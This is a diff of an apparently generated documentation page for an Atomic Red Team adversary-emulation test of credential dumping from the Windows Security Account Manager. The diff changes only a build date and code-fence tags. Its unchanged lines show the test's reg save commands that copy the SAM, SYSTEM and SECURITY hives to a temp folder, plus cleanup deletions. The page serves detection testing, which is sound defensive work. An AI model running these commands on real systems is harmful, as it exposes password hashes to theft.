@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.002"
 attack_technique_name: "OS Credential Dumping: Security Account Manager"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "5c2571d0-1572-416d-9676-812e64ca9f44"
@@ -47,7 +47,7 @@ Upon successful execution of this test, you will find three files named, sam, sy
 
 ### Command
 
-```commandprompt
+```cmd
 reg save HKLM\sam %temp%\sam
 reg save HKLM\system %temp%\system
 reg save HKLM\security %temp%\security
@@ -55,7 +55,7 @@ reg save HKLM\security %temp%\security
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del %temp%\sam >nul 2> nul
 del %temp%\system >nul 2> nul
 del %temp%\security >nul 2> nul
